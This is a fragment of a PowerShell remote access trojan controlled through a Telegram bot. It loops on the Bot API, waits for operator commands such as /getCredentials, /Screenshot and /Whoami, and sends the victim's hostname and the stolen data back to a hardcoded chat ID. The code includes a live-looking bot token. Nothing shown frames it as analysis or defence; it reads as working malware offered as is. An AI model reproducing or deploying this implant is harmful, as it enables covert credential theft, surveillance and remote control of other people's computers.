 if ($comando -like "/Whoami") {$texto = whoami_me;$texto = $texto -replace "@{","" -replace "}",""; $texto -replace "; ","`n" ; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/getCredentials") {sendCredentials}
 if ($comando -like "/Screenshot") {screen-shot }
 if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
}

function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}
[string]$botkey = "6233623113:AAESmYwdqGlUrFhUk9r9GAX0ix1zrrxfCfA";[string]$bot_Master_ID = "6238346325";[int]$delay = "1" 
$chat_id = $bot_Master_ID ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1"
while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
    $l = $json.result.length
	$i = 0
if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
	while ($i -lt $l) {$offset = $json.result[$i].update_id + 1
        $comando = $json.result[$i].message.text
        test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
   	$i++
	}
	Start-Sleep -s $delay ;$first_connect++}
